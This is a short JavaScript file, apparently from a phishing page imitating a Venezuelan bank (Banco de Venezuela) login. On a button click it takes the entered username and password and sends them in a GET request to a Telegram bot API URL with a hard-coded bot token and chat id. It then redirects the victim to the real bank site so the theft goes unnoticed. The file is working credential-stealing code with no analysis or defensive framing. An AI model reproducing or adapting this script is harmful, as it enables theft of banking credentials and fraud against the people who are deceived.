const sendatatme = document.getElementById("sendatatme");
const bdvfirst = document.getElementById("first");
const bdvsecond = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

bdvfirst.addEventListener("change", () => {
  resfirst.value = bdvfirst.value;
});
bdvsecond.addEventListener("change", () => {
  resecond.value = bdvsecond.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6613788181:AAGpavHiUREzemCGZWJPvoRnNfkZI0xUdi0/sendMessage?chat_id=6203967638&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

  window.location.href = "https://bdvenlinea.banvenez.com/";
}

sendatatme.addEventListener("click", redirect);